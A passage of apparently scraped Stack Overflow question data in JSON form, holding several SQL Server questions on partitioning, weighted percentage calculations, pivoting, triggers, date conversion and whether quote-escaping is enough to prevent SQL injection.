best.</p>\n\n<p>dbo.WeightItemTotal</p>\n\n<p>dbo.WeightCompletedItems</p>\n\n<p>dbo.WeightCategoryTotal</p>\n\n<p>dbo.PercentItemComplete</p>\n\n<p>dbo.PercentTaskComplete(TaskID)</p>\n\n<p>I use a couple of them to calculate a PercentItemComplete, then use it calculate a PercentTaskComplete. It's a lot of code to post here and works ok, at any rate.</p>\n\n<p>For around 2000 Tasks, it takes about 5 seconds to run dbo.PercentTaskComplete. Using dbo.PercentTaskComplete in a View along with a bunch of other related tables and fields all add up to an 18 second wait for these records.</p>\n\n<p>I'm looking for a single query to accomplish the same, if possible, with the expectation that the performance can be bettered.</p>\n\n<p>Is this a trivial task for an expert? I don't know, but I hope someone can help me out with some advice.</p>\n\n<p><em><strong>[Edit]:</em></strong></p>\n\n<p>Important Correction: Weight can be an integer from 0 to 5.</p>\n\n<p>Script to insert data:</p>\n\n<pre><code>USE PercentageTest\n\nINSERT INTO dbo.Task (TaskName) VALUES('BRX 2012 Project')\nINSERT INTO dbo.Task (TaskName) VALUES('BRX 2013 Project')\n\nINSERT INTO dbo.ItemCategory (ItemCategoryName, Weight) VALUES('Documentation', 1)\nINSERT INTO dbo.ItemCategory (ItemCategoryName, Weight) VALUES('Planning', 2)\n\nINSERT INTO dbo.Item (ItemCategoryID, ItemName, Weight)\nSELECT ItemCategoryID, 'Drawings', 1\nFROM ItemCategory WHERE ItemCategoryName = 'Documentation' UNION\nSELECT ItemCategoryID, 'Engineering Specifications', 3\nFROM ItemCategory WHERE ItemCategoryName = 'Documentation' UNION\nSELECT ItemCategoryID, 'Field Review of Scope of Work', 4\nFROM ItemCategory WHERE ItemCategoryName = 'Planning' UNION\nSELECT ItemCategoryID, 'Markup Plot Plan With Scope', 0\nFROM ItemCategory WHERE ItemCategoryName = 'Planning'\n\nINSERT INTO dbo.TaskItem (TaskID, ItemID, DateCompleted)\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Drawings'), '01/01/2012'\nFROM Task WHERE TaskName = 'BRX 2012 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Engineering Specifications'), '01/01/2012'\nFROM Task WHERE TaskName = 'BRX 2012 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Field Review of Scope of Work'), NULL\nFROM Task WHERE TaskName = 'BRX 2012 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Markup Plot Plan With Scope'), '01/01/2012'\nFROM Task WHERE TaskName = 'BRX 2012 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Drawings'), NULL\nFROM Task WHERE TaskName = 'BRX 2013 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Engineering Specifications'), NULL\nFROM Task WHERE TaskName = 'BRX 2013 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Field Review of Scope of Work'), '01/01/2012'\nFROM Task WHERE TaskName = 'BRX 2013 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Markup Plot Plan With Scope'), NULL\nFROM Task WHERE TaskName = 'BRX 2013 Project'\n\n\n--DELETE FROM TaskItem\n--DELETE FROM Item\n--DELETE FROM Task\n--DELETE FROM ItemCategory\n</code></pre>\n\n<p>In addition to the function collection in the backend, we have modeled the calculation for TaskPercentComplete in our Task entity as a Property named PercentComplete. Hopefully this sheds some light on the route I take to calculate how far along a Task is to completeness, because it is a bit difficult and probably distracting to simply lay it all out in text:</p>\n\n<pre><code>    Public ReadOnly Property PercentComplete As Double\n    Get\n        Dim SumOfCategoryWeight = Me.ItemCategories.Where(Function(c) c.Weight &gt; 0).Sum(Function(c) c.Weight)\n        Dim CategoryWeightMultiplier = If(SumOfCategoryWeight &gt; 0, 100 / SumOfCategoryWeight, 0.0)\n        Dim SumOfItemWeight = Me.Items.Where(Function(i) i.Weight &gt; 0).Sum(Function(i) i.Weight)\n        Dim SumOfCompletedItemWeight = Me.TaskItems.Where(Function(ti) ti.DateCompleted.HasValue).Sum(Function(ti) ti.Item.Weight)\n        Dim PercentItemComplete = If(SumOfItemWeight &gt; 0, 100 / SumOfItemWeight, 0.0) * SumOfCompletedItemWeight\n        Dim PercentTaskComplete As Double\n\n        For Each c In Me.ItemCategories\n            PercentTaskComplete += ((PercentItemComplete / 100) * CategoryWeightMultiplier) * c.Weight\n        Next\n\n        Return PercentTaskComplete\n    End Get\nEnd Property\n</code></pre>\n\n<p>Essentially, per Task:</p>\n\n<p>I sum the weight of all ItemCategories (again, per Task) which are greater than zero. If that sum is greater than zero, using floating point division, I divide that sum into 100 to obtain a multiplier. If not, the multiplier = 0.</p>\n\n<p>Then I get the sum of the weight of all Items which are greater than zero and the sum of the weight of all completed Items.</p>\n\n<p>I get PercentItemComplete by dividing the sum of Item weights into 100, multiplying it by the sum of the weight of completed Items (those which have a value for DateCompleted).</p>\n\n<p>Then for each ItemCategory in use by a given Task, I calculate a value equal to PercentItemComplete divided by 100 times the CategoryWeightMultiplier times the weight of the category.</p>\n\n<p>PercentTaskComplete is the sum of each of the values in the loop.</p>\n\n<p>That's a mouthful. At any rate, the above formula applied to the inserted data yields these results:</p>\n\n<p>Task 'BRX 2012' percent complete = 50</p>\n\n<p>Task 'BRX 2013' percent complete = 50</p>\n\n<p>Those categories or items which have zero weight are discarded by the formula; whether completed or not, they do not affect the overall percent complete. They are in place only to serve as \"weightless\" reminders for the person planning the Task.</p>\n\n<p>I hope this is enough (and not too much) information.</p>\n"},{"tags":["asp.net","sql-server-2008","sql-server-2005","c#-4.0"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":136,"score":2,"question_id":12250645,"title":"asp.net displaying stored procedure results on HtmlTable from codebehind","body":"<p>what is the best way to dynamically create a table from codebehind, where data for it is retrieved from a stored procedure (SQL 2008)??\nAnd will it make difference if I use HtmlTable instead of asp.net Table?\nAppreciate the help!</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2","sql-server-2000"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":82,"score":0,"question_id":12245034,"title":"Case not working in Exists in Sql Server","body":"<p>I have a scenario where i have to check a variable for it's default value, and if it has i have to check EXISTS part conditionally with Table2 and if it does not have the default value, i have to check EXISTS part conditionally with Table3.</p>\n\n<p>Below is a sample code:-</p>\n\n<pre><code>SELECT * FROM tbl1 WHERE EXISTS (SELECT CASE WHEN @boolVar = 0 THEN (SELECT 'X' FROM tbl2 WHERE tbl1.col1 = tbl2.col1) ELSE (SELECT 'X' FROM tbl3 where tbl1.col1 = tbl3.col1) END)\n</code></pre>\n\n<p>Demo query with constants for testing purpose: - </p>\n\n<pre><code>SELECT 1 WHERE EXISTS (SELECT CASE WHEN 1 = 0 THEN (SELECT 'X' WHERE 1=0) \n    ELSE (SELECT 'X' WHERE 1 = 2) END)\n</code></pre>\n\n<p>Note: - The above query always returning 1, even not a single condition is satisfying.</p>\n\n<p>I know we can use OR operator for the same and any how we can achieve it, but i really want to know that in case both the tables have no rows satisfying their particular where clause, even it's returning all the rows from Table1.</p>\n\n<p>I tried to explain the same with the demo query with constant values.</p>\n\n<p>Please help.</p>\n"},{"tags":["sql-server","sql-server-2005","alter-table","database-partitioning"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":356,"score":1,"question_id":996277,"title":"Why would 'alter table switch partition' fail silently?","body":"<p>I have a partitioned fact table on a SQL Server 2005 (Ent, Ed., 32 bit, SP2) that I am constructing a partition for (the fact table is a snapshot type).  The process builds the data in a separate table, applies appropriate indexes and then switches the partition into the table.</p>\n\n<ol>\n<li><p>This has worked in the past</p></li>\n<li><p>The table structures are identical and the command raises no errors.  If you drop one of the indexes it will raise an error complaining about that.</p></li>\n</ol>\n\n<p>For some reason the command to switch the partition raises no errors but fails silently.  I cannot see why this might be the case.  </p>\n\n<p>For example,</p>\n\n<pre><code>alter table wk.FactRIAgedDebt\n      switch partition 12\n      to fact.RIAgedDebt partition 12\n</code></pre>\n\n<p>Runs, with SSMS reporting '<code>Command (s) completed successfully.</code>' but running something such as <code>select count (*) from fact.RIAgedDebt</code> returns 0 rows.  The source table <code>wk.FactRIAgedDebt</code> still has the data in it.</p>\n\n<ul>\n<li>Is it a known bug?</li>\n<li>Am I doing something obvious wrong?</li>\n<li>Has anyone seen this phenomenon before?</li>\n</ul>\n"},{"tags":["sql","sql-server-2005","table","database-partitioning"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2266,"score":0,"question_id":460942,"title":"Partitioning in SQL Server 2005","body":"<p>I have some questions about partitioning and strategy, how and when to use it. As I understood from <a href=\"http://msdn.microsoft.com/en-us/library/ms345146.aspx#sql2k5parti_topic1\" rel=\"nofollow\">Partitioned Tables and Indexes in SQL Server 2005</a>, partitioning is not used only for manageability but also to improve performance on very large database tables (VLDB). We have a table with millions of records. This table store performance data, for example how many times was specified item be clicked and so on. We need evaluate this data for current month in real application on daily basis. What I want to prevent is to move data from one table to another, only because of performance.\nMy idea was: I create partition on this VLDB by month for current year. Then I would create clustered index on date field of table and partition scheme. I don’t know if I understand it correctly, but what I except is, that index will be created per partition separately.</p>\n\n<p>Generally how my code looks like in development phase.</p>\n\n<pre><code>/*\nMaybe it looks like complicated, but instead of static upper bound, \nI use function to determine end of the month for the current year.\n\nSo for example (executed in year 2009)\n    SELECT DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1901)*12)+1-1,31-1)) \nreturns \n    2008-01-30 23:59:59.997\n*/\nCREATE PARTITION FUNCTION PartitionMonthlyCurrentYear(DATETIME) AS\nRANGE LEFT FOR VALUES\n(\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1901)*12)+1-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+1-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+2-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+3-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+4-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+5-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+6-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+7-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+8-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+9-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+10-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+11-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+12-1,31-1))\n);\n\n/*\nCreate scheme on the primary file group. I'm aware about performance issues of this.\n*/\nCREATE PARTITION SCHEME SchemeMonthlyCurrentYear \nAS PARTITION PartitionMonthlyCurrentYear\nALL TO ([PRIMARY]);\n\n/*\nCreate clustered index on table and scheme\n*/\nCREATE CLUSTERED INDEX [IX_Log_Seiten_archive_Datum] ON [dbo].[Log_Seiten_archiv] \n(\n    [Datum] DESC\n)ON SchemeMonthlyCurrentYear(Datum)\nGO\n</code></pre>\n\n<p>My questions:</p>\n\n<ol>\n<li>What you think about this approach?</li>\n<li>How can I remove table from\nspecified partition scheme? If I drop index, still can’t drop scheme and function because there is still dependency on table *Log_Seiten_archiv*</li>\n<li>How can I assign table to use different partition function? Because of development I need often change how partitions function is defined, or create new one. How can I do this for existing table? For example I want change year on function I showed before.</li>\n</ol>\n\n<p>Regards\nAnton Kalcik</p>\n"},{"tags":["sql","sql-server-2005","database-partitioning"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":257,"score":1,"question_id":3298682,"title":"Sql Server 2005 - Add partition scheme to a non partitioned table","body":"<p>I have a table that has more than 50 million records and which does not have any\npartition. But now i want to add a partition scheme to this table. This table has a primary key. But i want to partition it using another int column. How can i do it?</p>\n"},{"tags":["sql","sql-server-2005","database-partitioning"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":370,"score":2,"question_id":5103723,"title":"Rule of thumb when to partition tables","body":"<p>I've seen many entries about partitioning tables, but there is not a lot of information on when you should make a partition.</p>\n\n<p>Is there a rule of thumb when you should partition tables in SQL Server. </p>\n\n<p>Thanks</p>\n"},{"tags":["java","sql-server-2005","jdbc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12242667,"title":"How to convert String to datetime in the SQL query?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10494528/tsql-datetime-from-character-string-error\">TSQL: datetime from character string error</a>  </p>\n</blockquote>\n\n\n\n<p>I am unable to convert String to datetime. I am using SQL Server 2005.</p>\n\n<pre><code>String frmDate=\"03/09/2012\";\nString toDate=\"04/09/2012\";\n\nSimpleDateFormat formater = new SimpleDateFormat(\"dd/MM/yyyy\");\nDate frmDate1 = formater.parse(frmDate);\nDate toDate1=formater.parse(toDate);\n\n\n String query3=\"select * from dbo.Monthly_PFSPL \"  +  \n    \"where Convert (datetime,Added_Date,103) \"  +  \n\"between '\"+frmDate1+\"' and '\"+toDate1+\"' \";\n        rsobj1=stat2.executeQuery(query3);\n</code></pre>\n\n<p>I am getting this exception:</p>\n\n<pre><code>java.sql.SQLException: Conversion failed when converting datetime from character string\n</code></pre>\n"},{"tags":["c#","sql-server-2005","serialization","dataset","bytearray"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":143,"score":0,"question_id":12247809,"title":"convert large dataset to bytes array using C#?","body":"<p>I am able to convert dataset to bytes array using <a href=\"http://vbcity.com/forums/t/111506.aspx\" rel=\"nofollow\">this link</a> and this code:</p>\n\n<pre><code>System.IO.MemoryStream stream = new System.IO.MemoryStream();\nSystem.Runtime.Serialization.IFormatter formatter = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();\nformatter.Serialize(stream, dtUsers); // dtUsers is a DataTable\n\nbyte[] bytes = stream.GetBuffer(); \n</code></pre>\n\n<p>But the system taking it's toll lot memory , freezing when resultset  returning 500000 or more records.Is there any better way to accomplish the same with one shot.Any help would be appreciated.Database is SQL Server 2005 and VS 2008 for C#.</p>\n"},{"tags":["sql-server-2005","database-restore","transaction-log"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2619,"score":2,"question_id":4249592,"title":"How do I undo an update statement I made to a database","body":"<p>It's a test environment, I needed some data to test an Update query, but accidentally updated a column in all rows to have wrong data. Must I use a backup to restore the data back to the previous instance, or is there some secret with transaction log that I can take advantage of?</p>\n\n<p>Thanks in advance. </p>\n"},{"tags":["sql-server-2005","data","filesystems","archive"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12243262,"title":"Archiving Sql data into file System","body":"<p>I have a sql database, need to archive the database into filesystem(excel files).</p>\n\n<p>Is the size of the data will increased or not when i migrate to filesystem?</p>\n\n<p>I am doing archive through c# and save into files.</p>\n\n<p>Some of the experts suggested the data of the filesystem is more as compared to the sql data.</p>\n\n<p>is it right or wrong</p>\n"},{"tags":["sql-server-2005","ejb-2.x"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12243111,"title":"Reusing same prepared statement for multiple queries in java","body":"<p>Which is better practice: Reusing same prepared statement for multiple queries by closing &amp; re-opening it. OR Using different prepared statements using the naming conventions for different queries ?</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":75,"score":2,"question_id":12242131,"title":"How to make dynamic column","body":"<p>I have some data as under</p>\n\n<pre><code>Declare @t table (Id int identity,CommaSeperatedValue varchar(100))\nInsert Into @t \nSelect 'Somalia,Vietnam' Union All \nSelect 'apple,banana,guava,India,Australia'\n</code></pre>\n\n<p>There is no limit in the CommaSeperated value. The desired output for the sample provided will be</p>\n\n<pre><code>Id  Col1    Col2    Col3    Col4    Col5\n1   Somalia Vietnam Null    Null    Null\n2   apple   banana  guava   India   Australia\n</code></pre>\n\n<p>That means , the columns will  be generated dynamically. Let us take another example</p>\n\n<pre><code>Declare @t table (Id int identity,CommaSeperatedValue varchar(100))\nInsert Into @t \nSelect 'Somalia,Vietnam,Honolulu,Spain' Union All \nSelect 'apple,banana,guava,India,Australia,Smart,Bus' Union All\nSelect 'Mango'\n</code></pre>\n\n<p>The desired output</p>\n\n<pre><code>Id  Col1    Col2    Col3    Col4    Col5        Col6    Col7    \n1   Somalia Vietnam Honolulu Spain  Null        Null    Null\n2   apple   banana  guava   India   Australia   Smart   Bus\n3   Mango   Null    Null    Null    Null        Null    Null\n</code></pre>\n\n<p>How to do this query?</p>\n\n<p>My attempt so far(after this I am lost) </p>\n\n<pre><code>SELECT \n    X.id,\n    X.CommaSeperatedValue,\n    Y.splitdata \nFROM\n (\n    SELECT *,\n    CAST('&lt;X&gt;'+REPLACE(F.CommaSeperatedValue,',','&lt;/X&gt;&lt;X&gt;')+'&lt;/X&gt;' AS XML) AS xmlfilter \n    FROM @t F\n )X\n CROSS APPLY\n ( \n    SELECT fdata.D.value('.','varchar(50)') as splitdata \n    FROM X.xmlfilter.nodes('X') as fdata(D)\n )Y\n</code></pre>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12241661,"title":"using name value pair to update record in database - sql server","body":"<p>Have been looking this up in Google but could not find anything.</p>\n\n<p>Wanted to know if there is a way in SQL Server 2005 that I could use Name Value pairs to update records in the db.</p>\n\n<p>I have a list of Name Value pairs and want to update all the records where Name could be found as a columm value (something that you would specify in where clause) and if the record is found ... update the record with the Value paired with the name</p>\n\n<p>For instance, something like</p>\n\n<pre><code>update X set column_value = &lt;Value paired with the Name&gt; where column_name = &lt;Name from the list&gt;\n</code></pre>\n\n<p>P.S. I have a list of more than 1000 records and this could be more.</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":429,"score":2,"question_id":1661120,"title":"Multiple Record Update Fire A Trigger Once","body":"<p>I have a table where on a single record update, a trigger adds a history record in another\ntable.</p>\n\n<p>When I run a multiple record update on the table the trigger does not work since it was implemented to work with only one record and a trigger runs only once for a statement regardless if it affects multiple records. Is there a way to make this work?</p>\n\n<p>Can I use the following check:</p>\n\n<pre><code>**if @@rowcount = 1**\n</code></pre>\n\n<p>in order to handle a single record in the way it is handled now and in the else statement to handle it in another way(which I do not know)?</p>\n\n<p>The problem is how can I handle each case atomically when I have multiple records and how can I take every each record from the INSERTED table?</p>\n\n<p>The trigger currently initializes some variables from the INSERTED table, updates the datetime column on the same table and then attempts to insert a history record using the initialized variables I mentioned earlier. So these are the steps I would like to have supporting multiple records.</p>\n\n<p>Can anybody provide me with a simple example or guidelines?</p>\n\n<p>Thank you in advance</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":60,"score":2,"question_id":12206696,"title":"Using for XML in T-sql to pivot data","body":"<p>I am attempting to use the for XML function to pivot some data.  My data is as follows:</p>\n\n<pre><code>VenNum_A   VenNum_B\n0001       0002\n0001       0003\n0001       0004\n0005       0006\n0005       0007\n0005       0008\n</code></pre>\n\n<p>I am attempting to get the following result:</p>\n\n<pre><code>venNum_A   VenNum_B\n0001       0002,0003,0004\n0005       0006,0007,0008\n</code></pre>\n\n<p>My Code so far: </p>\n\n<pre><code>; with t as\n        (\n        select Distinct \n            A_VenNum, B_VenNum, SUM(1) as Cnt\n        From \n            #VenDups_Addr\n        Group by \n            A_VenNum, B_VenNum\n        )\n        select distinct\n            B_Vennum,\n             A_Vennum =cast(substring((\n            select distinct \n                  [text()] =  ', ' + t1.A_Vennum \n            from \n                  t as t1\n            where \n                t.A_Vennum =t1.A_VenNum\n            for XML path('')\n                ),3,99) as Varchar(254))\n\n        From t  \n</code></pre>\n\n<p>Currently my results are no different than slecting both original fields. </p>\n\n<p>Any help will be greatly appreciated. </p>\n\n<p>Also if this is not the best method of reaching my end goal I am totaly open to an alternate solution, This is the only way I know of doing this. </p>\n\n<p>Also excuse my poor formating</p>\n"},{"tags":["c#","sql","sql-server","sql-server-2005","sql-injection"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":147,"score":0,"question_id":12235262,"title":"SQL Injections with replace single-quotation and validate integers","body":"<p>I just want to know, If I replace every <code>'</code> with <code>''</code> in user inputs, for instance <code>string.Replace(\"'\",\"''\")</code>, and validate numbers (make sure that they are numbers, and do not contain any other character), is SQL Injection still possible? How?</p>\n\n<p>I'm using dynamic SQL queries, using <code>SqlCommand</code>. Something like this:</p>\n\n<pre><code>cmd.CommandText = \"SELECT * FROM myTable WHERE ID = \" + theID.ToString();\n</code></pre>\n\n<p>or</p>\n\n<pre><code>cmd.CommandText = \"UPDATE myTable SET title='\" + title.Replace(\"'\",\"''\") + \"' WHERE ID = \" + theID.ToString();\n</code></pre>\n\n<p>Input integers are automatically validated (checked whether they are a real number) in ASP.NET MVC.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","clustered-index"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":404,"score":0,"question_id":10799413,"title":"Clustered Indexes without Primary key","body":"<p>A <a href=\"http://www.simple-talk.com/sql/learn-sql-server/sql-server-index-basics/\" rel=\"nofollow\">clustered index</a> stores the actual data rows at the leaf level of the index. Returning to the example above, that would mean that the entire row of data associated with the primary key value of 123 would be stored in that leaf node.</p>\n\n<p><img src=\"http://i.stack.imgur.com/Rlhzv.jpg\" alt=\"enter image description here\"></p>\n\n<p><strong>Question</strong> - in case the primary key does not exists and I set the <code>Name</code> column as clustered index. In this case, will the above statement becomes contradictory?</p>\n"},{"tags":["sql-server-2005","entity-framework",".net-3.5"],"answer_count":5,"favorite_count":14,"up_vote_count":23,"down_vote_count":0,"view_count":14226,"score":23,"question_id":1013333,"title":"Entity Framework and Sql Server view question","body":"<p>For several reasons that I don't have the liberty to talk about, we are defining a view on our Sql Server 2005 database like so:</p>\n\n<pre>\nCREATE VIEW [dbo].[MeterProvingStatisticsPoint]\nAS\nSELECT\n    CAST(0 AS BIGINT) AS 'RowNumber',\n    CAST(0 AS BIGINT) AS 'ProverTicketId',\n    CAST(0 AS INT) AS 'ReportNumber',\n    GETDATE() AS 'CompletedDateTime',\n    CAST(1.1 AS float) AS 'MeterFactor',\n    CAST(1.1 AS float) AS 'Density',\n    CAST(1.1 AS float) AS 'FlowRate',\n    CAST(1.1 AS float) AS 'Average',\n    CAST(1.1 AS float) AS 'StandardDeviation',\n    CAST(1.1 AS float) AS 'MeanPlus2XStandardDeviation',\n    CAST(1.1 AS float) AS 'MeanMinus2XStandardDeviation'\nWHERE 0 = 1\n</pre>\n\n<p>The idea is that the Entity Framework will create an entity based on this query, which it does, but it generates it with an error that states the following:</p>\n\n<p>\"warning 6002: The table/view 'Keystone_Local.dbo.MeterProvingStatisticsPoint' does not have a primary key defined. The key has been inferred and the definition was created as a read-only table/view.\"</p>\n\n<p>And it decides that the CompletedDateTime field will be this entity primary key. </p>\n\n<p>We are using EdmGen to generate the model. Is there a way not to have the entity framework include any field of this view as a primary key?</p>\n\n<p>Thanks for help.</p>\n"},{"tags":["sql","sql-server-2005","date","varchar"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":65,"score":-4,"question_id":12229540,"title":"SQL 2005 compare Date saved as VARCHAR","body":"<p>I have saved dates as VARCHAR in sql server 2005\nnow I want to select all dates before 2013 and I can't.</p>\n\n<p>WDATE 09/01/2012\n      08/13/2012</p>\n\n<p>I want to compare those dates with any other date\nI am using this query:</p>\n\n<pre><code>SELECT * FROM Work_Order\nWHERE  WDATE  &lt; '09/02/2012'\n</code></pre>\n\n<p>but it subtract days then months then years which is not my case</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":0,"favorite_count":1,"up_vote_count":3,"down_vote_count":1,"view_count":233,"score":2,"question_id":12180854,"title":"TSQL - divide rows into groups based on one field","body":"<p>This is modified version of my earlier question: <a href=\"http://stackoverflow.com/questions/12059119/tsql-equally-divide-resultset-to-groups-and-update-them\">TSQL equally divide resultset to groups and update them</a> </p>\n\n<p>I have my database with 2 tables like so:</p>\n\n<p>Orders table has data like below:</p>\n\n<pre><code>OrderID    OperatorID    GroupID        OrderDesc    Status    Cash    ...\n--------------------------------------------------------------------------\n      1             1          1      small_order         1     300 \n      2             1          1    another_order         1       0 \n      3             1          2      xxxxxxxxxxx         2    1000 \n      5             2          2      yyyyyyyyyyy         2     150 \n      9             5          1      xxxxxxxxxxx         1      50 \n     10          NULL          2      xxxxxxxxxxx         1     150 \n     11          NULL          3      xxxxxxxxxxx         1     -50 \n     12             4          1      xxxxxxxxxxx         1     200 \n</code></pre>\n\n<p>Operators table:</p>\n\n<pre><code>OperatorID    Name    GroupID    Active\n---------------------------------------\n      1       John          1         1\n      2       Kate          1         1\n      4       Jack          2         1\n      5       Will          1         0\n      6        Sam          3         0\n</code></pre>\n\n<p>I'm able to equally divide my recordset into equally groups using below query:</p>\n\n<pre><code>SELECT o.*, op.operatorName AS NewOperator, op.operatorID AS NewOperatorId\nFROM (SELECT o.*, (ROW_NUMBER() over (ORDER BY newid()) % numoperators) + 1 AS randseqnum\n      FROM Orders o CROSS JOIN\n     (SELECT COUNT(*) AS numoperators FROM operators WHERE operators.active=1) op\n      WHERE o.status in (1,3)\n     ) o JOIN\n     (SELECT op.*, ROW_NUMBER() over (ORDER BY newid()) AS seqnum\n      FROM Operators op WHERE op.active=1\n     ) op\n     ON o.randseqnum = op.seqnum ORDER BY o.orderID\n</code></pre>\n\n<p>Demo available at: <a href=\"http://sqlfiddle.com/#!3/ff47b/1\" rel=\"nofollow\">http://sqlfiddle.com/#!3/ff47b/1</a></p>\n\n<p>Using script from above I can divide Orders to (almost) equal groups but based on number or Orders for Operator, but I need to modify it so that it will assign Operators to Orders based on sum or <code>Cash</code> for orders.</p>\n\n<p>For example:</p>\n\n<p>If I have 6 Orders with <code>Cash</code> values: 300, 0, 50, 150, -50, 200 they sum gives 650.<br />\nMy script should assign to 3 Operators random 2 Orders with random sum of <code>Cash</code> for Orders.<br />\nWhat I would like to get is to assign for example 300,-50 to operator1, 200, 0 to second and 150, 50 to third.<br />\nHope this sound clear :)</p>\n\n<p>Here is example output that I expect to get:</p>\n\n<pre><code>ORDERID  OPERATORID  GROUPID    DESCRIPTION  STATUS  CASH  NEWOPERATORID\n------------------------------------------------------------------------\n      1           1        1    small_order       1   300              2\n      2           1        1  another_order       1     0              1\n      9           5        1    xxxxxxxxxxx       1    50              4\n     10      (null)        2    xxxxxxxxxxx       1   150              4\n     11      (null)        3    xxxxxxxxxxx       1   -50              2\n     12           4        1    xxxxxxxxxxx       1   200              1\n</code></pre>\n\n<p><strong>How can I (if I can at all) assign Operators to my Orders so that sum or <code>Cash</code> will be closest to average</strong></p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":12219655,"title":"Matching up tables to group properly","body":"<p>Im having a lot of trouble counting the amount of vendors per county, per state in our database.  Was hoping someone could help me out.  </p>\n\n<p>I have one table called vendors which lists the vendors id (key) and their current assignments.  </p>\n\n<p>the next table is called postal codes and the columns i need from it are postalcode, FIPS (this is a code for counties in the US) and state. this is simply a list of possible states, postal codes and fips</p>\n\n<p>my third table is vendoraddresses, which lists the addresses of each vendor but does not have a county or fips column or else this would be very easy. this is linked to the vendor table through the vendorid key</p>\n\n<p>the final table is counties, which has the county name for each fips code lined up in rows (ie: 12345 = county name) </p>\n\n<p>im having trouble working with all of these tables together to accurately count the vendors per county per state.  i feel like this really shouldn't be so hard but i hit a mental block i guess.  Below is what i have so far, but its not what i need. Im wondering if a union or something like that would be a better choice to get all these tables together.</p>\n\n<pre><code>SELECT\n\nva.state\n,pc.fips\n,count(v.vendorid) as vendors\n\n\nFROM \nVendors v\njoin vendoraddresses va on va.vendorid = v.vendorid\njoin postalcodes pc on pc.postalcode = va.postalcode\ngroup by va.state, fips\norder by va.state, fips\n</code></pre>\n\n<p>so with some help ive tried to make some progress:</p>\n\n<pre><code>SELECT \nState1\n,County\n,COUNT(Vendor) as Vendors\nFROM\n(\nSELECT\nc.name as County, pc.State as State1, v.VendorID as Vendor\nFROM \nVendors v\njoin vendorserviceareas vsa on vsa.vendorid = v.vendorid\njoin vendorserviceareaentries vsae on vsae.vendorserviceareaid =     vsa.vendorserviceareaid \njoin counties c on c.fips = vsae.fips\njoin postalcodes pc on pc.fips = c.fips\n\nunion \n\nselect c.name as county, s.name as state1, vsa.Vendorid as Vendor from states s\njoin counties c on c.fips = 